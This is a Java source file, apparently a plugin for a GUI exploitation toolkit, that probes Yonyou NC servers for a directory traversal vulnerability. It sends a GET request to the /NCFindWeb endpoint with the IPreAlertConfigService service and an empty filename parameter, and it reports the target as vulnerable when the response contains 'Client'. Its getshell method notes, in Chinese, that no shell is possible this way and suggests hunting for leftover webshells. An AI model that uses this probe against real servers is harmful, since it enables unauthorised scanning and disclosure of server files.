package exp.oa.yongyou;

import core.Exploitlnterface;

import java.util.HashMap;

import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

public class yongyou_nc_NCFindWeb implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        return att(url, textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 目录遍历漏洞无法getshell，可查看是否存在历史遗留webshell");
        });
        return false;
    }

    private Boolean att(String url, TextArea textArea) {
        Response response = HttpTools.get(url + "/NCFindWeb?service=IPreAlertConfigService&filename=",
                new HashMap<>(), "utf-8");
        if (response.getCode() == 200 && response.getText().contains("Client")) {
            Platform.runLater(() -> {
                textArea.appendText("\n 目录遍历漏洞存在" + "\n" + url + "/NCFindWeb?service=IPreAlertConfigService&filename=");
            });
            return true;
        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n NC_NCFindWeb-目录遍历E-漏洞不存在 (出现误报请联系作者)");
            });
            return false;
        }
    }
}
